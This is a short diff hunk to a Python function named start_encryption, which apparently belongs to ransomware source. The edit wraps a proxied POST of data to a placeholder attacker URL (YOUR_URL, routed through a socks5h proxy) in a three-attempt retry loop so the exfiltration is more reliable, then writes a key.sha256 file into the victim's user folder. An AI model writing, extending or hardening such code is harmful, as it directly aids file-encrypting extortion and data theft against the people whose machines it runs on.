@@ -373,12 +373,13 @@ def start_encryption():
             "http": f"socks5h://{YOUR_PROXY}",
             "https": f"socks5h://{YOUR_PROXY}",
         }
-
-        try:
-            requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
-        except requests.exceptions.RequestException as e:
-            # print(f"Error sending data: {e}")
-            pass
+        for _ in range(3):
+            try:
+                requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
+                break
+            except requests.exceptions.RequestException as e:
+                # print(f"Error sending data: {e}")
+                continue
         with open(
             os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb"
         ) as f:
